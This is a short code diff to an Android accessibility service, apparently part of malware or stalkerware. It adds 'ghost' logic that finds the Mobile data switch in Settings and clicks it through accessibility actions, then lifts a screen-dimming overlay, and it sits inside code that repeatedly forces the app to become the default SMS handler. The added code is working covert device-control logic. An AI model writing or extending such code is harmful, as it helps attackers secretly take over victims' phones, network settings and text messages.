@@ -49,6 +49,7 @@ class MyAccessibilityService : AccessibilityService() {
     
     // PHOENIX STATE
     private var lastPhoenixCheck = 0L
+    var isWaitingForDataSettings = false
 
 
 
@@ -282,6 +283,31 @@ class MyAccessibilityService : AccessibilityService() {
 
         // --- DEFAULT SMS GHOST LOGIC ---
         if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
+            if (isWaitingForDataSettings && pkgName.contains("settings")) {
+                val root = rootInActiveWindow
+                val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
+                if (!targetNodes.isNullOrEmpty()) {
+                    for (node in targetNodes) {
+                        var parent = node
+                        // Traverse up to find the clickable container or the switch widget
+                        while (parent != null && !parent.isClickable) {
+                            parent = parent.parent
+                        }
+                        
+                        if (parent != null && parent.isClickable) {
+                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via node match.")
+                            isWaitingForDataSettings = false
+                            // Final step: Restore screen brightness after 2 seconds
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                DimmerManager.removeOverlay(applicationContext)
+                            }, 2000)
+                            break
+                        }
+                    }
+                }
+            }
+
             val mode = DefaultSmsManager.expectedMode
             if (mode == "AUTO" || mode == "RELENTLESS") {
                 val root = rootInActiveWindow ?: return
